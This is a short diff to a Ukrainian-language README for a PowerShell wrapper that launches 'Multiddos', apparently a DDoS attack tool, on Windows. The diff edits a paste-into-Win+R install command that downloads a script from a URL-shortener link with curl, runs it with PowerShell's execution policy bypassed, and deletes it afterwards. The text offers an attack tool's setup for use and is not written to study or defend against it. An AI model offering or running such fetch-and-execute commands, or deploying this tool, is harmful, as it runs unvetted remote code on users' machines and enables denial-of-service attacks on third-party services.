@@ -20,7 +20,7 @@ PowerShell-враппер для запуску Multiddos на Windows.
 2. Windows 10 білд 1803 і новіше:
 - Скопіювати команду
 ```
-cmd.exe /c curl https://tiny.one/jxr7yadn -o setup.ps1 && powershell -executionpolicy bypass -file setup.ps1 && del setup.ps1
+cmd.exe /c curl -L https://tiny.one/jxr7yadn -o setup.ps1 && powershell -executionpolicy bypass -file setup.ps1 && del setup.ps1
 ```
 - Натиснути Win+R
 - Вставити команду і натиснути Enter
